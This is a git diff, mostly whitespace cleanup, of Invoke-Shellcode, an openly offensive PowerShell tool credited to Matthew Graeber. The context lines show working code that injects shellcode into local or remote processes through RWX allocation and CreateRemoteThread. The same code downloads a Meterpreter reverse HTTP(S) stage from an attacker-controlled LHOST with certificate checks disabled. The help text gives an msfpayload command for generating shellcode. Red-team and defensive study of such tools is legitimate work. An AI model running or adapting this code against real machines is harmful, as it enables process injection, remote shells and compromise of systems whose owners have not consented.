@@ -10,17 +10,17 @@ Author: Matthew Graeber (@mattifestation)
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
- 
+
 .DESCRIPTION
 
 Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre
 
 PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
 
-msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
+msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2-
 
 Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
- 
+
 .PARAMETER ProcessID
 
 Process ID of the process you want to inject shellcode into.
@@ -38,7 +38,7 @@ Lists all of the available Metasploit payloads that Invoke-Shellcode supports
 Specifies the IP address of the attack machine waiting to receive the reverse shell
 
 .PARAMETER Lport
- 
+
 Specifies the port of the attack machine waiting to receive the reverse shell
 
 .PARAMETER Payload
@@ -55,7 +55,7 @@ Optionally specifies whether to utilize the proxy settings on the machine.
 
 .PARAMETER Legacy
 
-Optionally specifies whether to utilize the older meterpreter handler "INITM". This will likely be removed in the future. 
+Optionally specifies whether to utilize the older meterpreter handler "INITM". This will likely be removed in the future.
 
 .PARAMETER Force
 
@@ -123,16 +123,16 @@ LPORT     80               yes       The local listener port
 .EXAMPLE
 
 C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
-    
+
 Description
 -----------
 Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
 Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
-    
+
 .EXAMPLE
 
 C:\PS> Invoke-Shellcode -ListMetasploitPayloads
-    
+
 Payloads
 --------
 windows/meterpreter/reverse_http
@@ -155,35 +155,34 @@ http://www.exploit-monday.com
     [ValidateNotNullOrEmpty()]
     [UInt16]
     $ProcessID,
-    
+
     [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
     $Shellcode,
-    
+
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateSet( 'windows/meterpreter/reverse_http',
-                  'windows/meterpreter/reverse_https',
-                  IgnoreCase = $True )]
+                  'windows/meterpreter/reverse_https')]
     [String]
     $Payload = 'windows/meterpreter/reverse_http',
-    
+
     [Parameter( ParameterSetName = 'ListPayloads' )]
     [Switch]
     $ListMetasploitPayloads,
-    
+
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
     [ValidateNotNullOrEmpty()]
     [String]
     $Lhost = '127.0.0.1',
-    
+
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
     [ValidateRange( 1,65535 )]
     [Int]
     $Lport = 8443,
-    
+
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateNotNull()]
     [String]
@@ -198,24 +197,24 @@ http://www.exploit-monday.com
     [ValidateNotNull()]
     [Switch]
     $Proxy = $False,
-    
+
     [Switch]
     $Force = $False
 )
 
     Set-StrictMode -Version 2.0
-    
+
     # List all available Metasploit payloads and exit the function
     if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
     {
         $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
             Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
-    
+
         foreach ($Payload in $AvailablePayloads.ValidValues)
         {
             New-Object PSObject -Property @{ Payloads = $Payload }
         }
-        
+
         Return
     }
 
@@ -225,17 +224,17 @@ http://www.exploit-monday.com
         # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
         Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
     }
-    
+
     function Local:Get-DelegateType
     {
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -250,7 +249,7 @@ http://www.exploit-monday.com
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
 
@@ -259,11 +258,11 @@ http://www.exploit-monday.com
         Param
         (
             [OutputType([IntPtr])]
-        
+
             [Parameter( Position = 0, Mandatory = $True )]
             [String]
             $Module,
-            
+
             [Parameter( Position = 1, Mandatory = $True )]
             [String]
             $Procedure
@@ -280,7 +279,7 @@ http://www.exploit-monday.com
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
+
         # Return the address of the function
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
@@ -295,12 +294,12 @@ http://www.exploit-monday.com
             $LittleEndianByteArray = New-Object Byte[](0)
             $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
             [System.Array]::Reverse($LittleEndianByteArray)
-            
+
             Write-Output $LittleEndianByteArray
         }
-        
+
         $CallStub = New-Object Byte[](0)
-        
+
         if ($IntSizePtr -eq 8)
         {
             [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
@@ -321,7 +320,7 @@ http://www.exploit-monday.com
             $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
             $CallStub += 0xFF,0xD0                              # CALL  EAX
         }
-        
+
         Write-Output $CallStub
     }
 
@@ -329,7 +328,7 @@ http://www.exploit-monday.com
     {
         # Open a handle to the process you want to inject into
         $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
-        
+
         if (!$hProcess)
         {
             Throw "Unable to open a process handle for PID: $ProcessID"
@@ -341,7 +340,7 @@ http://www.exploit-monday.com
         {
             # Determine is the process specified is 32 or 64 bit
             $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
-            
+
             if ((!$IsWow64) -and $PowerShell32bit)
             {
                 Throw 'Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
@@ -352,7 +351,7 @@ http://www.exploit-monday.com
                 {
                     Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 }
-                
+
                 $Shellcode = $Shellcode32
                 Write-Verbose 'Injecting into a Wow64 process.'
                 Write-Verbose 'Using 32-bit shellcode.'
@@ -363,7 +362,7 @@ http://www.exploit-monday.com
                 {
                     Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 }
-                
+
                 $Shellcode = $Shellcode64
                 Write-Verbose 'Using 64-bit shellcode.'
             }
@@ -374,19 +373,19 @@ http://www.exploit-monday.com
             {
                 Throw 'No shellcode was placed in the $Shellcode32 variable!'
             }
-            
+
             $Shellcode = $Shellcode32
             Write-Verbose 'Using 32-bit shellcode.'
         }
 
         # Reserve and commit enough memory in remote process to hold the shellcode
         $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
-        
+
         if (!$RemoteMemAddr)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
         }
-        
+
         Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy shellcode into the previously allocated memory
@@ -399,25 +398,25 @@ http://www.exploit-monday.com
         {
             # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
-            
+
             Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
         {
             # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
-            
+
             Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
 
         # Allocate inline assembly stub
         $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
-        
+
         if (!$RemoteStubAddr)
         {
             Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
         }
-        
+
         Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"
 
         # Write 32-bit assembly stub to remote process memory space
@@ -425,7 +424,7 @@ http://www.exploit-monday.com
 
         # Execute shellcode as a remote thread
         $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
-        
+
         if (!$ThreadHandle)
         {
             Throw "Unable to launch remote thread in PID: $ProcessID"
@@ -445,7 +444,7 @@ http://www.exploit-monday.com
                 Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 return
             }
-            
+
             $Shellcode = $Shellcode32
             Write-Verbose 'Using 32-bit shellcode.'
         }
@@ -456,36 +455,36 @@ http://www.exploit-monday.com
                 Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 return
             }
-            
+
             $Shellcode = $Shellcode64
             Write-Verbose 'Using 64-bit shellcode.'
         }
-    
+
         # Allocate RWX memory for the shellcode
         $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$BaseAddress)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
         }
-        
+
         Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy shellcode to RWX buffer
         [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
-        
+
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
-        
+
         if ($PowerShell32bit)
         {
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
-            
+
             Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
         {
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
-            
+
             Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
 
@@ -495,7 +494,7 @@ http://www.exploit-monday.com
         {
             Throw "Unable to allocate thread call stub."
         }
-        
+
         Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy call stub to RWX buffer
@@ -510,7 +509,7 @@ http://www.exploit-monday.com
 
         # Wait for shellcode thread to terminate
         $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
-        
+
         $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
         $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
 
@@ -523,7 +522,7 @@ http://www.exploit-monday.com
     {
         $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
         $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
-        
+
         $64bitCPU = $true
     }
     else
@@ -550,10 +549,10 @@ http://www.exploit-monday.com
             $RootInvocation = $MyInvocation.Line
 
             $Response = $True
-        
+
             if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
                    "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
-        
+
             if ( !$Response )
             {
                 # User opted not to launch the 32-bit payload from 32-bit PowerShell. Exit function
@@ -581,25 +580,25 @@ http://www.exploit-monday.com
             # Exit the script since the shellcode will be running from x86 PowerShell
             Return
         }
-        
+
         $Response = $True
-        
+
         if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
                "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
-        
+
         if ( !$Response )
         {
             # User opted not to carry out download of Metasploit payload. Exit function
             Return
         }
-        
+
         switch ($Payload)
         {
             'windows/meterpreter/reverse_http'
             {
                 $SSL = ''
             }
-            
+
             'windows/meterpreter/reverse_https'
             {
                 $SSL = 's'
@@ -607,8 +606,8 @@ http://www.exploit-monday.com
                 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
             }
         }
-        
-        if ($Legacy) 
+
+        if ($Legacy)
         {
             # Old Meterpreter handler expects 'INITM' in the URI in order to initiate stage 0
             $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
@@ -619,7 +618,7 @@ http://www.exploit-monday.com
             $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {[Char]$_}
             $SumTest = $False
 
-            while ($SumTest -eq $False) 
+            while ($SumTest -eq $False)
             {
                 $GeneratedUri = $CharArray | Get-Random -Count 4
                 $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
@@ -627,22 +626,22 @@ http://www.exploit-monday.com
 
             $RequestUri = -join $GeneratedUri
 
-            $Request = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
+            $Request = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)"
         }
-           
+
         $Uri = New-Object Uri($Request)
         $WebClient = New-Object System.Net.WebClient
         $WebClient.Headers.Add('user-agent', "$UserAgent")
-        
+
         if ($Proxy)
         {
             $WebProxyObject = New-Object System.Net.WebProxy
             $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
-            
+
             # if there is no proxy set, then continue without it
-            if ($ProxyAddress) 
+            if ($ProxyAddress)
             {
-            
+
                 $WebProxyObject.Address = $ProxyAddress
                 $WebProxyObject.UseDefaultCredentials = $True
                 $WebClientObject.Proxy = $WebProxyObject
@@ -727,9 +726,9 @@ http://www.exploit-monday.com
         $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
         $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
         $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
-    
+
         Write-Verbose "Injecting shellcode into PID: $ProcessId"
-        
+
         if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                  "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
         {
@@ -751,13 +750,13 @@ http://www.exploit-monday.com
         $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
         $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
         $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
-        
+
         Write-Verbose "Injecting shellcode into PowerShell"
-        
+
         if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                  "Injecting shellcode into the running PowerShell process!" ) )
         {
             Inject-LocalShellcode
         }
-    }   
+    }
 }
